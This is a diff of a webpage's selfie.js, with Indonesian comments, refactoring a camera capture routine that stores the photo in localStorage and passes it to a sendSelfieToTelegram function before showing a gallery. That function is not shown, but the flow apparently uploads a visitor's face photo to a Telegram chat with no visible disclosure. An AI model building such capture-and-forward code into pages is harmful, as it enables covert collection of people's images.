@@ -1,12 +1,13 @@
-// js/selfie.js
+let stream; // ✅ Diperlukan global
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const takeBtn = document.getElementById("takeSelfie");
+const takeSelfie = document.getElementById("takeSelfie");
 
 function startCamera() {
   navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
+    .then(s => {
+      stream = s;
       video.srcObject = stream;
       video.play();
     })
@@ -15,26 +16,23 @@ function startCamera() {
     });
 }
 
-takeBtn.addEventListener("click", () => {
-  // Tangkap gambar dari video
+takeSelfie.onclick = () => {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   canvas.getContext("2d").drawImage(video, 0, 0);
 
-  // Stop kamera
-  const tracks = video.srcObject.getTracks();
-  tracks.forEach(track => track.stop());
-
-  // Ambil data URL gambar
   const selfieData = canvas.toDataURL("image/png");
   localStorage.setItem("selfie", selfieData);
 
-  // Sembunyikan modal kamera
+  // ✅ Stop kamera dengan aman
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+
+  // Sembunyikan modal
   document.getElementById("modalSelfie").style.display = "none";
 
-  // Kirim ke Telegram
+  // Kirim & lanjut
   sendSelfieToTelegram(selfieData);
-
-  // Lanjut ke galeri
   showGallerySlide();
-});
+};
